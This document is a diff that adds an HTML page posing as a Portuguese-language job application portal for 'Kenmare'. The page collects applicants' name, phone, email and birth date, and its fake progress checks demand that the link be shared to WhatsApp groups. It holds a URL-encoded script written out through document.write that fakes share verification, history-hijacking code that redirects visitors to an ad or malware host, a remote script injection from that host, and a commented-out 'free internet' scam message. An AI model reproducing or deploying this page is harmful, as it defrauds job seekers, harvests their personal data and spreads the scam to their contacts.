@@ -1,0 +1,661 @@
+
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+      
+      
+      
+          <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+       <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Kenmare Recrutamento</title>
+        <link rel="shortcut icon" type="image/png" href="" />
+        <meta name="og:title" content="Kenmare Recrutamento" />
+        <meta property="og:description" content="Candidate-se ao recrutamento no Kenmare" />
+        <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEhjsquwYZD3IflO1LajcSJykZxuI5aGS24MfHeTskkVA86LWrj922K8tDlbfbpOezjh3VOacLMi1xRqyyMyaMi1LszMMag9TPA5T9Q3P_ASTs7yfX5Z4vT4eT_k6pXeISQFZpX2F8PAnysIyxNteXLI4S_flBvIkLpuaheRjw5HrN529iYnjGQ3_kjO0UdB" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+<link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
+<link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
+<link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
+<link rel="me" href="https://www.blogger.com/profile/13505557265109218333" />
+<link rel="me" href="https://www.blogger.com/profile/06403291488377277313" />
+<link rel="me" href="https://www.blogger.com/profile/01562472738468891477" />
+<link rel="me" href="https://www.blogger.com/profile/17993298365031265285" />
+<link rel="me" href="https://www.blogger.com/profile/00513774263068055772" />
+</head>
+<body>
+  <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
+
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ffffff;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #ffffff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #0f0f0f;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: red;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #ffffff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(65, 86, 72);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #415648;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #0f0f0f;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(65, 86, 72);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #415648;
+}
+#fill,
+#fill2 {
+    background: #415648;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    color: #0d2a52	
+    font-size: 16px;
+    border: 2px solid #415648;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+color: #0f0f0f	
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+    color: #000000;	
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(65, 86, 72);
+}
+</style>
+  
+  
+  
+  
+                    <center><img src="https://blogger.googleusercontent.com/img/a/AVvXsEiFugzNAUp9WG4kHAKqJDTRaMQFg1yY-xiigUhWuZRfgg8c_W8CxLg5TVYDldmwDhVHbNrfzz_JsXZ6ZWt7W2HgXQYlbMa6bhDfB1NXbPXz-IHo4x2Wq1R1s0l5y88a4eYUuBdR_xrnm-IXGk36AWK-9cpU1rb9GXd7M3FCMUIaxvEgBfog4pbKPxLQ2hQR" alt="Free-Data" style="width: 100%;">
+      
+                     </center>
+
+
+  
+                        <div class="A">
+                        <font color="red">CANDIDATURA A UMA FUNÇÃO NA KENMARE</font><br><br><font color="#FFFFFF">Para ser considerado para uma posição na Kenmare, preencha o formulário de inscrição abaixo.<br><br>Após preencher a inscrição e concluir todos os requisitos, você pode visualizar todas as vagas de emprego atuais. Manteremos os detalhes arquivados e, se suas qualificações corresponderem a uma vaga em nossa equipe, entraremos em contato com você diretamente.</font>
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1710964,"","ffffff");</script><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+
+
+
+	<center>
+<font color="RED"> PREENCHA O FORMULÁRIO ABAIXO PARA CONTINUAR: </font><br/></center><br>
+              
+              
+
+               <center>
+<font color="#415648"> Digite seu nome </font><br/></center>
+                <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+              
+              <center>
+<font color="#415648"> Insira seu número de telefone </font><br/></center>
+              <center><input type="char" placeholder="" id="name" name="phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+              
+              <center>
+<font color="#415648"> Digite o endereço de e-mail</font><br/></center>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+              
+              <center>
+<font color="#415648">Insira sua data de nascimento</font><br/></center>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+              
+              <center><p class="title"><font color="#415648">Selecione gênero</font></p></center>
+          <center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">Selecione o gênero aqui</option>
+  <option value="1">Macho</option>
+  <option value="2">Fêmea</option>
+</select>
+</center><br>
+              
+          
+                 
+              
+               
+          
+               
+            <button id="go">APLICAR</button>
+        </div>
+        <div id="loader">
+            <div><font color="#0f0f0f">Verificando suas informações...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+         
+          
+              <center><p class="title"><font color="red">Selecione a faixa etária</font></p></center>
+          <center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">Selecione a faixa etária</option>
+  <option value="1"> 18-25 anos</option>
+  <option value="2"> 25-35 anos</option>
+  <option value="1"> 35-45 anos</option>
+</select>
+</center><br>
+          
+                  
+          <button id="confirm">Continuar</button>
+            </div>
+            <p class="error">Desculpe, seu nome está faltando<a href="https://tinyurl.com/kenmareresources-recrutamento"> <b><font color="#14948F">ADICIONE UM NOME</font></b></a></p>
+        </div>
+        <div id="checking">
+          <p class="title"><font color="#0f0f0f">Carregando o portal do aplicativo...</font></p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+          <p class="tip"><font color="black">NOME DO CANDIDATO: </font><span id="getname"></span>.</p>
+            <p class="tip">
+              <font color="black">Caro Candidato, Após verificar as informações fornecidas, você foi qualificado com sucesso e sua inscrição para o recrutamento do Porto de Maputo está prestes a ser submetida para aprovação imediata.<br></font><span class="amount"> <font color="RED">Siga cuidadosamente as instruções abaixo para enviar sua inscrição com sucesso.</font></span><br><br>
+              <font color="black"> Como proceder:</font>
+            </p><br><font color="black">
+            <p class="tip">1. Compartilhe este recrutamento com 5 grupos ou 15 amigos no WhatsApp (clique no ícone "COMPARTILHAR" abaixo).</p>
+            <p class="tip">2. Você será redirecionado automaticamente para nossa página “ENVIAR” assim que a barra for preenchida para enviar sua inscrição para aprovação imediata.</p>
+            <p class="tip">3. Após compartilhar e enviar sua solicitação com sucesso, você receberá um SMS indicando que a solicitação foi aceita.</p>
+          </font>
+
+            <button id="whatsapp">COMPARTILHAR</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+           <br/>
+          <a  onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#FFFFFF">CRIE UM PERFIL</font></button>
+                    </a><br/>
+          
+          
+          <a  onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#FFFFFF">ENVIE SUA APLICAÇÃO</font></button>
+                    </a><br/>
+          
+          
+          <a  onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#FFFFFF">ESCOLHA A POSIÇÃO</font></button>
+                    </a><br/>
+          
+          
+       <a  onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#FFFFFF">RELATAR UM PROBLEMA</font></button>
+                    </a><br/>
+             <br/>
+            <button id="offer">ENVIAR</button><br/>
+             
+             
+          
+          
+              </div>
+            </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"30%20GB%20Free%20Internet%20Offer%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+      <script>
+        var text1 = "*Portal de Recrutamento Online do Kenmare 2025*%0A%0AA Kenmare abriu um portal de inscrição para recrutar novos trabalhadores para preencher as várias vagas. A inscrição é gratuita e o emprego já começou. Precisamos de pessoas com a combinação de habilidades, experiência e ambição para se juntar à nossa equipe e impulsionar nosso sucesso.%0A%0A*Os candidatos interessados ​​devem enviar suas inscrições online no link abaixo:*%0A%0Ahttps://tinyurl.com/kenmareresources-recrutamento",
+            text2 = " an amount of ",
+            text3 = "pour chaque citoyen qui remplit les conditions pour aider la classe pauvre à surmonter la crise. Entrez et inscrivez-vous maintenant et assurez-vous de vous inscrire correctement 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://whouphesaussums.net/4/6980104",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://whouphesaussums.net/4/6980104";
+    }
+    function goon(){
+        location.href="https://whouphesaussums.net/4/6980104";
+    }
+</script>
+
+
+
+	   <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://whouphesaussums.net/4/6980104;
+    }
+    function goon(){
+        location.href="https://whouphesaussums.net/4/6980104;
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://whouphesaussums.net/4/6980104";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+  
+</div>
+
+  <script>/<![CDATA[/ cookieChoices = {}; /]]>/</script>
+</body></html>
+<center><img src="https://blogger.googleusercontent.com/img/a/AVvXsEgnl0g_smYGyVJsAZeT61fhsDLbx2iC6FV0wWPLVTfAkbxu9eMn-EDyUXzJ_yxfmdCoHsQk_eKmMS8rqTnRaXCFUjrHjAIuCWdI3H1WhPPIWZocDAsikI9QF8h_jfiQ0Iq6l3gOg52kgP0Amj1GsW1xqfgBk5_HMCy6abjDUZsEfSj5JEfzVLFAm6Ii-teU" alt="Free-Data" style="width: 100%;">
+      
+                     </center>
